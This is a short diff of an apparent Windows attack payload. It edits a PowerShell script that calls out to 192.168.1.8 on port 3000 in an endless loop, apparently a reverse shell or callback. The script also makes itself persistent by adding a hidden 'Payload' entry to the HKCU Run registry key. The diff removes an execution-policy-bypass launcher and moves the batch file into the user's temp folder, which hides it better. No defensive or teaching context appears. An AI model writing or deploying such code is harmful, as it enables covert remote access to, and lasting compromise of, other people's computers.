@@ -1,10 +1,4 @@
-@echo off
-powershell.exe -noprofile -executionpolicy bypass -file "C:\Users\econt\Desktop\payload2.ps1"
-pause
-econt@DESKTOP-TRACPJE C:\Users\econt\Desktop>
-
-econt@DESKTOP-TRACPJE C:\Users\econt\Desktop>type payload2.ps1
-∩╗┐$ip = '192.168.1.8';
+$ip = '192.168.1.8';
 $port = '3000';
 
 while ($true) {
@@ -20,7 +14,7 @@ while ($true) {
 # Define the registry path, entry name, and script file path
 $runKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $entryName = "Payload"
-$filePath = "C:\Users\econt\Desktop\payload.bat"
+$filePath = "C:\Users\econt\AppData\local\temp\payload.bat"
 
 # Construct the value to run the batch file silently
 # This uses Start-Process via PowerShell to hide the console window
